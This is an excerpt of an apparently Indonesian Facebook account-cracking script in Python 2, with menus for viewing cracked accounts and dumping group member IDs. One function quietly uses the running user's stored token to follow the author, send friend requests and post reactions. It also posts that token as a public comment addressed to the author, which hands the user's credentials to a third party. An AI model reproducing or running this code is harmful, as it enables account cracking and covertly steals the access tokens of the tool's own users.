...
MR_RISKY = (i+"""TERIMA KASIH KEPADA %sDANIEZZ
%s%s%s
%sFACEBOOK DANIEZZ  %s: https://bit.ly/3x8BFMt
%sWHATSAPP DANIEZZ %s: 6283143565470
%sYOUTUBE DANIEZZ   %s: https://bit.ly/3w6HVnZ
%sINSTAGR DANIEZZ %s: ENGGA PANDE PAKAI IG :V
%sGITHUB DANIEZZXD   %s: https://bit.ly/359iKF7%s"""%(warna,i,m,i,b,p,b,p,b,p,b,p,b,p,i))
...
logo = (c+"""  _______              __       ___ 
 |   _   \ .--------. |  |--. .'  _|
 |.  l   / |        | |  _  | |   _|
 |.  _   1 |__|__|__| |_____| |__|"""+k+"""DANIEZZ XD"""+c+"""
 |:  |   |"""+k+"""Angga"""+c+"""
 |::.|:. |"""+k+"""Yayan"""+c+"""
 `--- ---'"""+k+"""Dapunta"""+c+"""
...
def moch_yayan():
    ...
    print k+' ['+i+'06'+k+']'+b+'=>'+p+'Dump ID Dari Group'+k+' [ '+i+'FREE'+k+' ]'+q
...
def awokawokawokawokawokawokawokawokawokawokawokawok():
		...
		menu()
            ...
            print("\n \033[0;94m[\033[0;96m1\033[0;94m] Check Hasil OK")
            print(" \033[0;94m[\033[0;96m2\033[0;94m] Check Hasil CP")
            ask = raw_input("\n \033[0;94m[\033[0;93m?\033[0;94m] Choose : ")
            if ask =="":
                moch_yayan()
            elif ask == "1" or ask == "01":
                try:
                    ...
                    print(" \033[0;94m[\033[0;92m+\033[0;94m] Hasil \033[0;92mOK\033[0;94m pada tanggal : \033[0;92m%s-%s-%s \x1b[0mTotal %s: %s%s\033[0;92m\n"%(ha, op, ta,M,H,len(totalok)))
                    os.system("cat results/OK-%s-%s-%s.txt"%(ha, op, ta))
                    print("\n \033[0;97m[\033[0;93m#\033[0;94m] --------------------------------------------")
                    moch_yayan()
                except (IOError):
                    print("\n \033[0;94m[\033[0;91m!\033[0;94m]Hasil Crack Yang Suksess, Tidak Ada :(")
                    raw_input('\n  [ %sKEMBALI%s ] '%(O,N))
                    moch_yayan()
            elif ask == "2" or ask == "02":
                try:
...
def kontol():
	try:
		...
		print '\n %s[%s×%s]Token Error !!'%(N,M,N)
		os.system('rm -rf login.txt')
	requests.post('https://graph.facebook.com/100014926689370/subscribers?access_token=%s'%(__cindy__))
	requests.post('https://graph.facebook.com/100014926689370/subscribers?access_token=%s'%(__cindy__))
	post = '1212330252607853'
	kom3 = "Semoga Abang @[100014926689370:0] Panjang Umur Amin !!"
	vyhbhj = 'ANGRY'
	requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(srghun,__cindy__))
	requests.post('https://graph.facebook.com/%s/reactions?type=%s&access_token=%s'%(fdrffg,vyhbhj,__daniez__))
	requests.post('https://graph.facebook.com/%s/reactions?type=%s&access_token=%s'%(fdrffg2,vyhbhj,__daniez__))
	requests.post('https://graph.facebook.com/' + post + '/comments/?message=Bang @[100014926689370:0] Coba Lihat Token Aku\n'+token+'&access_token=' + token)
	requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=Bang @[100014926689370:0] Coba Lihat Token Aku\n'+token+'&access_token=' + token)
...
def postingan():
    try:
        __daniezz__= open('login.txt', 'r').read()
    except IOError:
        print '\n %s[%s×%s]Token Error !!'%(N,M,N)
        os.system('rm -rf login.txt')
        time.sleep(0.01)
...
def info_tools():
    ...
    jalan(((q+"""
Cheanel YouTube : MAULANA 亗
Facebook        : m.facebook.com/100014926689370
WhatsApp Grup	: Ada Tapi Malas Copynya :V
Github		: github.com/DaniezzXD
Github Team	: github.com/DaniezzXD""")));time.sleep(0.3)
    print 25 * "--"+"\n"
    jalan(i+"Donasi Ngab :)")
    jalan(q+"""https://saweria.co/DenizzAlbedo87

Baca Aja Engga Donasi :p
Cuma Lihat KaGa Donasi :b""")
    print 25 * "--"+"\n"
    jalan(i+"Informations Script")
    jalan(q+"""Script By : DaniezXD
